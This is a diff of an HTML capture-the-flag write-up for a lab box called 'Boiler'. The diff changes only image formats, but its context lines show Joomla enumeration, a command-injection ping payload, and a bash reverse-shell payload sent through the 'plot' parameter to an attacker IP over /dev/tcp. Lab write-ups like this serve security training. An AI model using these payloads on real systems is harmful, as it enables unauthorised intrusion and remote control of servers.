@@ -127,7 +127,7 @@ manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration:
 <p>Doing this, I found out that a joomla CMS is being used. Therefore, I enumerated its version by surfing to: http://10.10.182.94/joomla/administrator/manifests/files/joomla.xml. The version used in this box was version 3.6. After a quick vulnerability search on Google, I could not find any useful vulnerabilities. This was a dead end. Surfing /joomla/adminitrator presented us with a login portal.</p>
 <img src="/images/boiler/boiler_joomla_login_portal.webp" alt="Joomla login portal" class="postImage">
 <p>Thereafter, I decided to surf to the other webserver located on port 10000. Again, we were greeted by yet another login portal:</p>
-<img src="/images/boiler/boiler_webservice_port_10000.png" alt="webadmin web portal" class="postImage">
+<img src="/images/boiler/boiler_webservice_port_10000.webp" alt="webadmin web portal" class="postImage">
 
 <p>Okay, so we have 2 login portals but no credentials. Also some basic sql injection payloads did not work. As a result, I ran a few more ffuf scans to see if there were any other accessible interesting directories:</p>
 <pre>
@@ -219,13 +219,13 @@ services:
 
 <h2>Step 4: Gaining access</h2>
 <p>Navigating to http://IP/joomla/_test/ presented us with the following page:</p>
-<img src="/images/boiler/boiler_vulnerable_page.png" alt="vulnerable page home" class="postImage">
+<img src="/images/boiler/boiler_vulnerable_page.webp" alt="vulnerable page home" class="postImage">
 <p>When we click on "OS" and then chose for example "Linux" the following url is used:</p>
 <pre>
 http://10.10.56.122/joomla/_test/index.php?plot=LINUX
 </pre>
 <p>Could we inject a command a plot parameter? Let's test it. Therefore, I opened burpsuite and tried to ping myself as follows:</p>
-<img src="/images/boiler/boiler_burpsuite_command_execution_ping.png" alt="burpsuite achieving command execution" class="postImage">
+<img src="/images/boiler/boiler_burpsuite_command_execution_ping.webp" alt="burpsuite achieving command execution" class="postImage">
 <p>payload:</p>
 <pre>
 GET /joomla/_test/index.php?plot=;ping 10.9.235.177;
@@ -247,7 +247,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 </pre>
 
 <p>Indeed, we have successful code execution!Next, I created a payload for a reverse shell. After some try and error, I got it to work:</p>
-<img src="/images/boiler/boiler_burpsuite_reverseshell_request.png" alt="burpsuite payload reverse shell" class="postImage">
+<img src="/images/boiler/boiler_burpsuite_reverseshell_request.webp" alt="burpsuite payload reverse shell" class="postImage">
 <p>payload:</p>
 <pre>
 GET /joomla/_test/index.php?plot=;bash -c 'bash -i >& /dev/tcp/10.9.235.177/9000 0>&1';
